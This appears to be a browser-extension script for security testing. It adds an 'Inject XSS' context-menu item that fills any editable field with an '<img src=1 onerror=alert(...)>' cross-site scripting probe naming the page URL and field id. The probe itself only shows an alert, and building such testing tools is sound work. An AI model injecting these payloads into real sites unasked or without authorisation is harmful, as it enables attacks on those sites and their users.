let elem = 0

browser.menus.create({
  title: "Inject XSS",
  documentUrlPatterns: ["*://*/*"],
  contexts: ["editable"],
});

browser.menus.onClicked.addListener((info, tab) => {
    browser.tabs.executeScript(tab.id, {
      frameId: info.frameId,
      code: `elem = browser.menus.getTargetElement(${info.targetElementId});
      elem.value="<img src=1 onerror=alert(" + window.location.href + " Variable: " + elem.id + ")>"`,
    });
});